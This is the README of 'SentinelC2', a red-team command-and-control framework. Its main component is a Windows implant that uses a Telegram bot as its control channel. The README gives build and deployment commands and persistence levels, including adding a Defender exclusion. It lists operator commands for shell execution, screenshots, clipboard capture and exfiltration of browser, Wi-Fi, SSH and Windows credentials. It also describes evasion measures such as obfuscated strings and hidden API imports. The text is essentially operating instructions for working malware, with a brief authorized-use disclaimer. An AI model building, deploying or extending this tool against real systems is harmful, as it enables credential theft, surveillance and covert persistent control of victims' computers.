# SentinelC2 — Nim Agent + Server

> Red-team C2 framework. **Primary variant is Sentinel Telegram** — a single-file Windows implant that uses the Telegram Bot API as its C2 channel (no custom server, no VPS). The other agents and the WebSocket/both transports are frozen — they still compile but receive no new feature work.

## Variants

| Binary | Source | Purpose |
|---|---|---|
| `sentinel_tg_*.exe` | `sentinel.nim -d:c2_tg` | **Primary** — Telegram Bot API, native WinHTTP, 3 persistence levels |
| `sentinel_ws_*.exe` | `sentinel.nim -d:c2_ws` | WebSocket-over-TLS, needs `c2_server` |
| `sentinel_both_*.exe` | `sentinel.nim -d:c2_both` | WS primary + Telegram notify |
| `c2_server.exe` | `c2_server.nim` | Agent listener (8443) + dashboard (8080) + dashboard WS push (8081) |
| `agent_*.exe` / `agent_hardened_*.exe` / `agent_telegram.exe` | `agent.nim` / `hardened/` / `telegram/` | Frozen legacy variants |

Each sentinel build has three persistence levels: `silent` (no auto-persist), `engagement` (auto-persist on first connect), `aggressive` (persist + Defender exclusion registry write).

```
sentinel.nim  ~3100 lines — combines agent + hardened evasion + telegram transport
              Transport: -d:c2_tg | -d:c2_ws | -d:c2_both  (default c2_ws)
              Variant:   -d:variant_silent | engagement | aggressive
```

## Quick start — Sentinel Telegram (primary)

### 1. Bot setup (once)

Talk to [@BotFather](https://t.me/BotFather) → `/newbot` → save the token.
Send any message to the new bot from your Telegram, then:

```powershell
$token = "<BOT_TOKEN>"
(Invoke-WebRequest "https://api.telegram.org/bot$token/getUpdates" -UseBasicParsing).Content
# result[*].message.chat.id is your chat id
```

### 2. Build (Windows, Nim 2.2.x)

```powershell
# Nim at D:\appdata\nim-2.2.10\bin\nim.exe honoured via $env:NIM
.\build_sentinel.ps1 -Tg -Variant aggressive -BotToken "<token>" -ChatId "<chat id>"
# → build\sentinel_tg_aggressive.exe  (~420 KB, IAT: KERNEL32+msvcrt+USER32 only)
```

Runtime env overrides (no rebuild needed): `TELEGRAM_BOT_TOKEN`, `TELEGRAM_CHAT_ID`, `C2_NO_PERSIST`, `C2_NO_SANDBOX_CHECK`, `C2_LOG_FILE`, `C2_POLL_TIMEOUT`, `TELEGRAM_PROXY`.

### 3. Deploy

`DEPLOY_GUIDE.md` covers pen-drive staging, the live-Linux-USB flow, and Tailscale. In short:

```powershell
# On a test host (no persistence, verbose log):
$env:TELEGRAM_BOT_TOKEN = "<token>"; $env:TELEGRAM_CHAT_ID = "<id>"
$env:C2_NO_PERSIST = "1"; $env:C2_NO_SANDBOX_CHECK = "1"; $env:C2_LOG_FILE = "$env:TEMP\svc-X7K.log"
.\build\sentinel_tg_aggressive.exe
# → "SentinelC2 / Sentinel online" lands in your Telegram chat
```

Operator commands in Telegram (`/help` for the full list):

```
/sysinfo /whoami /ps /ls /cat /cd /pwd /env /drives /ipconfig /wifi /av
/cmd <shell>  /kill <pid>  /find <dir>*<glob>  /clip
/screenshot  /upload <path>  /dl <file_id>
/persist /stickykeys /cleanup /watch start 30 /selfdestruct /sleep N /exit /status
/exfil browser|wifi|cloud|ssh|recent|wincreds
```

## Other builds

```powershell
.\build.ps1            # 3 baseline agents + c2_server
.\build_hardened.ps1   # 3 hardened agents (wipes build/ — rebuild c2_server after)
.\build_sentinel.ps1                    # WS silent
.\build_sentinel.ps1 -Tg  -Variant silent -BotToken ... -ChatId ...   # Telegram
.\telegram\build_telegram.ps1 -BotToken ... -ChatId ...               # legacy telegram
```

## Verify

```powershell
python tests/e2e_harness.py --start              # 26 assertions (WS path)
nim c -r -d:release --nimcache:tests/cache tests/test_crypto.nim
python tests/pe_imports.py build\agent_silent.exe
python tests/verify_hardened.py
```

IAT discipline: baseline `KERNEL32+msvcrt`; hardened adds `USER32`; Sentinel TG is `KERNEL32+msvcrt+USER32`.

## Architecture

```
Target (Windows)              Telegram cloud         Operator phone/desktop
+------------------+          +--------------+       +------------------+
| sentinel_tg_*.exe| --WinHTTP-> api.telegram.org <---> @IamSentinal_bot |
| mutex + persist  |  (no OpenSSL DLLs for pure TG)  private chat        |
+------------------+          +--------------+       +------------------+
```

WS/both transports instead use `ws://<server>:8443` with AES-256-GCM per-agent session crypto (HMAC-SHA256 registration, AAD-bound frames, counter nonce) and the `c2_server` dashboard on 8080/8081. See `DEPLOY.md` for the Tailscale Funnel path.

## Protocol (TG)

Long-poll `getUpdates` (offset = last update_id+1, timeout = `C2_POLL_TIMEOUT`), chat-id allow-list, UTF-8-sanitized replies, chunked `sendMessage` (3800-char limit), `sendDocument` for screenshots/uploads, bounded `execHidden` with 120s tree-kill, polling headroom via `WinHttpSetTimeouts`.

## OPSEC notes

- Every signatured literal is `encodeObf`-obfuscated; per-build 32-byte key via `xorkey.nim` (stream cipher, compile-time nonce)
- Dynamic WinHTTP resolution — TG build IAT has no `winhttp.dll`
- `AGENTS.md` lists all compile-time knobs; `SENTINELC2` docs live only in `AGENTS.md` — keep them out of tracked source

## Legal

Use only on systems you own or are explicitly authorized to test. Keep `C2_URLS`, `AGENT_SECRET`, `TELEGRAM_BOT_TOKEN`/`CHAT_ID` out of git.
